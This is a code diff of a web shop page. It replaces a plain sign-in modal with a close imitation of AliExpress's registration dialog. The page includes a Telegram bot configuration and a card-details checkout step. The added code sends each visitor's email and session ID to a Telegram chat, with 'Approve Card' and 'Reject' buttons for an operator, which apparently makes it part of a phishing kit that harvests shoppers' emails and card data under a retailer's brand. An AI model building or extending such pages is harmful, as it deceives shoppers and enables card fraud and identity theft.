@@ -114,28 +114,211 @@
     .checkout-icon-field:focus-within .checkout-input-icon { color:#ff6a00; }
     @media (max-width:720px) { .checkout-grid { grid-template-columns:1fr; } .checkout-fields { grid-template-columns:1fr; } .checkout-wrap { width:min(100% - 24px,600px); margin-top:18px; } .checkout-card { padding:18px; } }
 
-    /* Signin/Register Modal - Tailwind Style */
-    .signin-modal { position:fixed; inset:0; z-index:31; display:none; align-items:center; justify-content:center; padding:20px; background:rgba(0,0,0,.5); }
-    .signin-modal.open { display:flex; }
-    .signin-dialog { position:relative; width:min(420px,100%); background:#fff; padding:32px 36px 28px; border-radius:24px; box-shadow:0 16px 48px #0003; }
-    .signin-close { position:absolute; top:14px; right:16px; border:0; background:transparent; color:#777; font-size:28px; line-height:1; }
-    .signin-title { margin:0 0 16px; font-size:22px; font-weight:600; text-align:center; color:#222; font-family:ui-sans-serif, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-    .signin-protected { display:flex; justify-content:center; align-items:center; gap:7px; margin-bottom:34px; color:#3b4955; font-size:13px; }
-    .signin-protected::before { content:'✓'; display:grid; place-items:center; width:15px; height:15px; border-radius:50%; background:#11a96f; color:#fff; font-size:10px; font-weight:900; }
-    .signin-tabs { display:flex; border-bottom:1px solid #eee; margin-bottom:20px; }
-    .signin-tab { flex:1; text-align:center; padding:10px; cursor:pointer; font-size:14px; color:#666; }
-    .signin-tab.active { border-bottom:2px solid var(--brand); color:var(--brand); font-weight:600; }
-    .form-group { margin-bottom:18px; }
-    .form-group label { display:block; margin-bottom:6px; font-size:12px; color:#555; font-weight:600; }
-    .form-group input { width:100%; padding:12px 14px; border:1px solid #ddd; border-radius:8px; font-size:15px; background:#f9fafb; }
-    .form-group input:focus { outline:2px solid var(--brand); border-color:var(--brand); background:#fff; }
-    .btn-toggle { flex:1; border:0; border-radius:8px; padding:12px; font-weight:600; cursor:pointer; transition:opacity .15s; font-size:15px; }
-    .btn-toggle.signin { background:#fff; color:var(--brand); border:1px solid var(--brand); }
-    .btn-toggle.signin:hover { background:#fff1ee; }
-    .btn-toggle.register { background:linear-gradient(110deg,#f35e00,#ff831f); color:#fff; }
-    .btn-toggle.register:hover { opacity:0.95; }
-    .card-step { display:none; }
-    .card-step.active { display:block; }
+/* Signin/Register Modal - AliExpress Style */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    
+    .auth-overlay {
+      position: fixed;
+      z-index: 9999;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.58);
+      font-family: Inter, Arial, sans-serif;
+    }
+    
+    .auth-modal {
+      position: relative;
+      width: min(530px, 100%);
+      min-height: 555px;
+      padding: 48px 64px 26px;
+      background: #fff;
+      color: #222;
+    }
+    
+    .auth-close {
+      position: absolute;
+      top: 15px;
+      right: 18px;
+      border: 0;
+      padding: 0;
+      background: transparent;
+      color: #262626;
+      font-size: 32px;
+      font-weight: 300;
+      line-height: 1;
+      cursor: pointer;
+    }
+    
+    .auth-modal h2 {
+      margin: 0 0 14px;
+      text-align: center;
+      font-size: 23px;
+      font-weight: 700;
+      line-height: 1.2;
+    }
+    
+    .security-note {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 7px;
+      margin: 0 0 35px;
+      font-size: 12px;
+    }
+    
+    .security-note span {
+      display: grid;
+      width: 12px;
+      height: 12px;
+      place-items: center;
+      border-radius: 50%;
+      background: #09b66d;
+      color: #fff;
+      font-size: 9px;
+      font-weight: 700;
+    }
+    
+    .auth-form input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid #c9c9c9;
+      padding: 0 13px;
+      outline: none;
+      color: #222;
+      font: 500 14px Inter, Arial, sans-serif;
+    }
+    
+    .auth-form input::placeholder {
+      color: #999;
+    }
+    
+    .auth-form input:focus {
+      border-color: #222;
+    }
+    
+    .auth-form button {
+      width: 100%;
+      height: 48px;
+      margin-top: 20px;
+      border: 0;
+      background: #d1d1d1;
+      color: #fff;
+      font: 700 18px Inter, Arial, sans-serif;
+      cursor: not-allowed;
+    }
+    
+    .trouble-link,
+    .location-help,
+    .terms a {
+      color: #969696;
+      text-decoration: underline;
+    }
+    
+    .trouble-link {
+      display: block;
+      width: fit-content;
+      margin: 16px auto 27px;
+      font-size: 13px;
+    }
+    
+    .continue-with {
+      margin: 0;
+      color: #8f8f8f;
+      text-align: center;
+      font-size: 13px;
+    }
+    
+    .social-login {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 31px 18px 27px;
+    }
+    
+    .social-login button {
+      display: grid;
+      width: 43px;
+      height: 43px;
+      place-items: center;
+      border: 0;
+      padding: 0;
+      background: transparent;
+      cursor: pointer;
+      font-family: Arial, sans-serif;
+    }
+    
+    .account-icon {
+      color: #1a73e8;
+      font-size: 35px;
+    }
+    
+    .google {
+      color: #4285f4;
+      font-size: 40px;
+      font-weight: 700;
+    }
+    
+    .facebook {
+      border-radius: 50% !important;
+      background: #1877f2 !important;
+      color: #fff;
+      font-size: 38px;
+      font-weight: 700;
+    }
+    
+    .apple {
+      color: #000;
+      font-size: 38px;
+    }
+    
+    .x-login {
+      border-radius: 50% !important;
+      background: #050505 !important;
+      color: #fff;
+      font-size: 29px;
+    }
+    
+    .location {
+      display: block;
+      margin: 0 auto 9px;
+      border: 0;
+      background: transparent;
+      color: #555;
+      font: 11px Inter, Arial, sans-serif;
+      cursor: pointer;
+    }
+    
+    .location strong {
+      margin-left: 6px;
+      color: #222;
+      font-weight: 500;
+    }
+    
+    .terms {
+      max-width: 390px;
+      margin: 0 auto;
+      color: #999;
+      text-align: center;
+      font-size: 11px;
+      line-height: 13px;
+    }
+    
+.location-help {
+      display: block;
+      width: fit-content;
+      margin: 7px auto 0;
+      font-size: 11px;
+    }
+    
+    .auth-overlay {
+      display: none;
+    }
+    
+    .auth-overlay.show {
+      display: grid;
+    }
   </style>
   
   <!-- Telegram Bot Configuration -->
@@ -241,28 +424,46 @@
   </aside>
   
   <!-- Signin/Register Modal -->
-  <div class="signin-modal" id="signin-modal">
-    <div class="signin-dialog">
-      <button class="signin-close" id="close-signin">×</button>
-      <h2 class="signin-title">Sign In / Register</h2>
-      <div class="signin-protected">Protected by Telegram approval</div>
-      <div class="signin-tabs">
-        <div class="signin-tab active" data-tab="signin">Sign In</div>
-        <div class="signin-tab" data-tab="register">Register</div>
+  <div class="auth-overlay" id="signin-modal">
+    <section class="auth-modal" role="dialog" aria-modal="true" aria-label="Register or sign in">
+      <button class="auth-close" id="close-signin" aria-label="Close">&times;</button>
+
+      <h2>Register/Sign in</h2>
+
+      <p class="security-note">
+        <span>✓</span>
+        Your information is protected
+      </p>
+
+      <form id="signin-form" class="auth-form">
+        <input type="email" id="signin-email" placeholder="Email" aria-label="Email" required />
+        <button type="submit" disabled>Continue</button>
+      </form>
+
+      <a class="trouble-link" href="#">Trouble signing in?</a>
+
+      <p class="continue-with">Or continue with:</p>
+
+      <div class="social-login">
+        <button class="account-icon" aria-label="Sign in with account">👤</button>
+        <button class="google" aria-label="Sign in with Google">G</button>
+        <button class="facebook" aria-label="Sign in with Facebook">f</button>
+        <button class="apple" aria-label="Sign in with Apple">●</button>
+        <button class="x-login" aria-label="Sign in with X">𝕏</button>
       </div>
-      <div id="signin-forms">
-        <form id="signin-form" class="form-group">
-          <label for="signin-email">Email</label>
-          <input type="email" id="signin-email" required>
-          <button type="submit" class="btn-toggle signin">Sign In</button>
-        </form>
-        <form id="register-form" class="form-group" style="display:none">
-          <label for="register-email">Email</label>
-          <input type="email" id="register-email" required>
-          <button type="submit" class="btn-toggle register">Register</button>
-        </form>
-      </div>
-    </div>
+
+      <button class="location">Location: <strong>Kenya</strong>⌄</button>
+
+      <p class="terms">
+        By continuing, you confirm that you are an adult and have read and have accepted
+        our <a href="#">AliExpress Free Membership Agreement</a> and
+        <a href="#">Privacy Policy</a>.<br>
+        Your information may be used for marketing purposes, but you can
+        <a href="#">opt out</a> at any time.
+      </p>
+
+      <a class="location-help" href="#">Why choose a location?</a>
+    </section>
   </div>
   
   <!-- Checkout Success Modal -->
@@ -458,11 +659,15 @@
     }
     
     function showSigninModal() {
-      document.querySelector('#signin-modal').classList.add('open');
+      document.querySelector('#signin-modal').classList.add('show');
+    }
+    
+    function hideSigninModal() {
+      document.querySelector('#signin-modal').classList.remove('show');
     }
     
     function showCardModal(sessionId) {
-      document.querySelector('#signin-modal').classList.remove('open');
+      hideSigninModal();
       document.querySelector('#checkout-card-modal').setAttribute('aria-hidden', 'false');
       document.querySelector('#checkout-card-modal').classList.add('open');
       document.querySelector('#card-session-id').value = sessionId;
@@ -643,33 +848,23 @@ Proceeding to payment`,
       if (session) {
         updateSession(session.id, { email });
       }
-      document.querySelector('#signin-modal').classList.remove('open');
+      hideSigninModal();
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+        `🔔 CHECKOUT APPROVED
+ID: ${session.id}
+Email: ${email}`,
+        {
+          inline_keyboard: [
+            [{ text: '✅ Approve Card', callback_data: `approve_checkout:${session.id}` }],
+            [{ text: '❌ Reject', callback_data: `reject_checkout:${session.id}` }]
+          ]
+        }
+      );
     };
-    
-    document.querySelector('#register-form').onsubmit = (e) => {
-      e.preventDefault();
-      const email = document.querySelector('#register-email').value;
-      const session = getSession(window.currentSessionId);
-      if (session) {
-        updateSession(session.id, { email });
-      }
-      document.querySelector('#signin-modal').classList.remove('open');
-    };
-    
-    // Tab switching
-    document.querySelectorAll('.signin-tab').forEach(tab => {
-      tab.onclick = () => {
-        document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
-        tab.classList.add('active');
-        const target = tab.dataset.tab;
-        document.querySelector('#signin-form').style.display = target === 'signin' ? 'block' : 'none';
-        document.querySelector('#register-form').style.display = target === 'register' ? 'block' : 'none';
-      };
-    });
     
     // Close signin modal
     document.querySelector('#close-signin').onclick = () => {
-      document.querySelector('#signin-modal').classList.remove('open');
+      hideSigninModal();
     };
     
     // Card details handler
